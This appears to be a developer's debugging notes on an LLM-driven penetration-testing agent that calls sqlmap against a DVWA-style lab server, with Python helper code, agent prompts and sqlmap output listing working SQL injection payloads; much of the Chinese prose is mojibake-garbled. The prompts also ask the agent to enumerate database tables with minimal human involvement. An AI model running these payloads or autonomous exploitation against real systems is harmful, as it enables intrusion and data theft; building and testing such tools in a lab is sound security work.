you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# please check if there is sql injection bug

æ¨¡åž‹æŒç»­æ‹“å±•ï¼Œä¸€ç›´ä¸åœï¼Œ
![alt text](assets/pentestAssistant/image-24.png)
qwen-maxä¸ºé—­æºç‰ˆï¼Œå†æ¬¡æ›´æ¢æ¨¡åž‹ä¸ºqwen2.5-72b-instruct

you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# please check if there is sql injection bug

apiè°ƒç”¨ç€ï¼Œç„¶åŽåŒæ—¶æœ¬åœ°éƒ¨ç½²
```bash
GIT_LFS_SKIP_SMUDGE=1 git clone https://huggingface.co/Qwen/Qwen2.5-72B-Instruct

cd Qwen2.5-72B-Instruct

# æŸ¥çœ‹ LFS æ–‡ä»¶æŒ‡é’ˆï¼ˆæœªä¸‹è½½æ—¶æ˜¾ç¤ºæŒ‡é’ˆå“ˆå¸Œï¼‰
git lfs ls-files

git lfs pull #å…¨éƒ¨æ–‡ä»¶
```

you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# please check if there is sql injection bug,if there is, just answer yes,that's ok. do not need continue



## é‡æ–°debugæ•´ä¸ªæµç¨‹æžå…¶ç»†èŠ‚
å½“äº†è§£åˆ°code-serverå¹¶æˆåŠŸåº”ç”¨åŽï¼Œ
ä»ŽåŽŸæ¥çš„jupyteråªèƒ½è°ƒè¯•ipynbï¼Œåˆ°çŽ°åœ¨code-serverå¯ä»¥è°ƒè¯•å¤§åž‹pyé¡¹ç›®ï¼Œ
ç”±æ­¤æœ‰äº†è°ƒè¯•åŸºç¡€


æˆ‘ä»¬è¿™é‡Œä»ç„¶ä»¥ä¸Šé¢çš„promptä¸ºä¾‹å­ï¼Œ

you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# please check if there is sql injection bug,if there is, just answer yes or no


åœ¨æŒ‡å®šæ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾é€‰æ‹©å³å¯debug
![alt text](assets/pentestAssistant/image-25.png)

å½“æˆ‘ä»¬è¾“å…¥ä¸Šè¿°ç”¨æˆ·è¯·æ±‚promtæ—¶ï¼Œ
<font color='red'>1.1 plan agentæ ¹æ®user inputåˆ¶å®šplan</font>é¦–å…ˆplan agentå°†æŒ‰ç…§å…¶æ¨¡æ¿ï¼Œè¯·æ±‚æ¨¡åž‹è¿”å›žä¸€ä¸ªplanè§„åˆ’

>è¿™é‡Œæ¨¡åž‹è¿”å›žäº†
'1. [current step] Use sqlmap to test the URL http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit for SQL injection vulnerabilities.'


<font color='red'>1.2 æå–subplanï¼Œcurrent_step</font>
_get_current_subplanå‡½æ•°å°†æå–å½“å‰æ­¥éª¤çš„å­planï¼Œï¼ˆæ¯”å¦‚è¯´å¦‚æžœå½“å‰æ˜¯ç¬¬3æ­¥è®¡åˆ’çš„ç¬¬3.1æ­¥ï¼‰
```python
   def _get_current_subplan(self, plan: str):
        """ Get the current subtask """
        insts = plan.split('\n')#åˆ†å‰²å„è¡Œï¼Œæ¯è¡Œå¯¹åº”plançš„ä¸€ä¸ªæ­¥éª¤
        instNow = ''
        for self.current_subplan in insts:
            if '[current step]' in self.current_subplan:
                instNow = self.current_subplan
                break
        instNow = instNow.replace("current step", "")#è¿™é‡Œä¹‹å‰ä»£ç æ²¡è€ƒè™‘inplaceæ“ä½œï¼Œè¿˜æ˜¯ä¸ªbug
        return instNow
```

_extract_stepå‡½æ•°æ ¹æ® subplanæå–å‡º å½“å‰æ­¥éª¤current_stepä¸ºç¬¬å‡ æ­¥ï¼Œ
```python
    def _extract_step(self, output_string):
        # Use regular expressions to extract the sign (assuming the sign is a number followed by a period, like "2.")
        # \dï¼šè¡¨ç¤ºä¸€ä¸ªåè¿›åˆ¶çš„æ•°å­— [0-9]
        # \sï¼šè¡¨ç¤ºä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ï¼Œtabï¼Œæ¢é¡µç¬¦ç­‰ï¼‰
        match = re.match(r"\s*(\d+(\.\d+)?)[\.\s]", output_string)
        if match:
            return match.group(1)  # Returns the matching label part
        return None
```

> è¿™é‡Œsubplanå³è®¡åˆ’ç¬¬ä¸€æ­¥
> current_stepä¸º1

è¿™é‡Œè®¾ç½®è‹¥å¹¶æœªæå–åˆ°current_stepå³ it is noneåˆ™breakå‡ºé”™
è¿™é‡Œè®¾ç½®è¯´æŸä¸€ä¸ªæ­¥éª¤é‡å¤ä¸‰æ¬¡ï¼Œå°±continueå¹¶é‡æ–°æ¥åˆ¶å®šè®¡åˆ’


<font color='red'>2. éªŒè¯è®¡åˆ’å¯è¡Œæ€§agentè¿›è¡Œè®¡åˆ’éªŒè¯</font>
åˆ†ä¸ºä¸‰ç§ç±»åž‹
1.ä»…ä»…åˆ†æžç»“æžœå³å¯ï¼Œ
2.å·¥å…·è‡ªåŠ¨æ‰§è¡Œï¼Œ
3.æ‰‹åŠ¨æ“ä½œå¹¶èŽ·å–ç»“æžœ



<font color='red'>3. å¾ªçŽ¯å†æ¬¡é‡å¤ï¼Œä¸è¿‡ç”±plan agentå˜æˆ refine agent</font>
ç„¶åŽé‡å¤ä¸Šè¿°æ­¥éª¤ã€‚

> debugåœ¨è¿™é‡Œå°±æ˜¯ï¼Œ
> self.user_queryè¿˜æ˜¯ ç”¨æˆ·è¾“å…¥çš„è¯·æ±‚
> ç„¶åŽself.last_resultå°±æ˜¯ä¸Šæ¬¡sqlmapçš„è¾“å‡ºç»“æžœ


okï¼Œè‡³æ­¤ï¼Œä¸ºä»€ä¹ˆä¸€ç›´åœ¨æŒç»­å¾ªçŽ¯çš„åŽŸå› å°±æ‰¾åˆ°äº†ã€‚
å› ä¸ºç¼ºå°‘ä¸€ä¸ªç»“æžœåˆ†æžagentçš„è°ƒç”¨ï¼Œ æ ¹æ®è®¡åˆ’æ‰§è¡Œæˆæžœï¼Œåˆ¤æ–­ç”¨æˆ·è¯·æ±‚æ˜¯å¦å®Œæˆã€‚ã€‚


## åšå‡ºåˆæ­¥ä¿®æ”¹
1. 
æ ¹æ®æˆ‘çš„logic

å°†ä¸Šè¿°éªŒè¯planç±»åž‹åŽçš„ä»£ç é€»è¾‘è¿›è¡Œä¿®æ”¹ï¼Œ
auto,manuç±»åž‹å°†è¿›è¡Œå„ç§ç»“æžœè¾“å…¥ï¼Œ

ç„¶åŽè¿™ä¸¤ä¸ªæ‰§è¡ŒåŽï¼Œå‡æœ‰ä¸€ä¸ª analyståˆ†æžä¸‹ç»™å‡ºanswerï¼Œ
ç„¶åŽæœ€åŽæ‹¿ä¸€ä¸ª validator agentæ¥éªŒè¯ answeræ˜¯å¦æ»¡è¶³ç”¨æˆ·è¯·æ±‚ã€‚

åªæœ‰åœ¨ä¸æ»¡è¶³çš„æƒ…å†µä¸‹ï¼Œæ‰ç»§ç»­è¿›å…¥refinerçš„å¾ªçŽ¯ï¼Œ
ç„¶åŽï¼Œè¿™é‡Œæš‚ä¸”ä»ç„¶æŠŠ ä¸Šä¸€ä¸ªsubplançš„æ‰§è¡Œç»“æžœï¼Œè¿žåŒè®¡åˆ’ä¸¢ç»™refiner

2. refinerä¿®æ”¹è®¡åˆ’æ—¶ï¼Œ å¿…é¡»ç»“åˆç”¨æˆ·è¯·æ±‚ã€‚
   
   

### æ‰§è¡Œåˆ†æž
you are good at using sqlmap. the url is http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# please check if there is sql injection bug,if there is, just answer yes or no


ðŸ”§ Task analysis is:
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:05:09 /2025-03-07/

[08:05:09] [INFO] resuming back-end DBMS 'mysql' 
[08:05:09] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.24.4.144:84/login.php'. Do you want to follow? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=423r46tfrdh...ou9hcr1ir3;security=impossible;security=impossible'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 7795=7795#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176767671,(SELECT (ELT(8161=8161,1))),0x716b786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- vDFV&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6517 FROM (SELECT(SLEEP(5)))Lejl)-- vjiG&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7176767671,0x5561745048714f7a6c70554b587346676d6177556b7a6b734147716a76686a667a7179557a74576e,0x716b786a71),NULL#&Submit=Submit
---
[08:05:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP, PHP 5.5.9
back-end DBMS: MySQL >= 5.5
[08:05:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.24.4.144'
[08:05:09] [WARNING] your sqlmap version is outdated

[*] ending @ 08:05:09 /2025-03-07/


if already satisfy user:yes

> æ¨¡åž‹è®¤ä¸ºä¸Šè¿°ç»“æžœå·²ç»è¯´æ˜Žäº†ï¼Œåœ¨è¯¥urlå­˜åœ¨sql injection å³sql æ³¨å…¥æ¼æ´ž

æ ¹æ®ä»¥ä¸‹åšå®¢ï¼Œ
https://blog.csdn.net/qq_51325799/article/details/129430388

åŽŸæ¥ä¸Šè¿°ç»“æžœæ˜¯è¶³ä»¥è¯´æ˜Žï¼Œç½‘å€å­˜åœ¨æ¼æ´žäº†ã€‚




> pay attention to url http://10.24.4.144:84/ . please check if there is sql injection bug. just answer yes or no
> ä¸ç»™ æ³¨å…¥idï¼Œå°±æ˜¯åˆ†æžä¸å‡ºæ¥
>pay attention to url http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# . please check if there is sql injection bug. just answer yes or no
> ç»™äº†id å°±åˆ†æžå‡ºæ¥äº†



å­˜åœ¨æ³¨å…¥åˆ™ï¼ŒæŸ¥è¯¢å½“å‰ç”¨æˆ·ä¸‹çš„æ‰€æœ‰æ•°æ®åº“

pay attention to url http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# . please give me the database tables and columns using sql injection.please try to do not make me manu operate.

![alt text](assets/pentestAssistant/image-26.png)
è™½ç„¶ä»£ç åˆå‡ºäº†é—®é¢˜ï¼Œä½†æ˜¯å¥½åƒç¡®å®žæ˜¯æ‰¾åˆ°äº†

pay attention to url http://10.24.4.144:84/vulnerabilities/sqli/?id=1&Submit=Submit# . please give me the database's table names using sql injection.please try to do not make me manu operate.

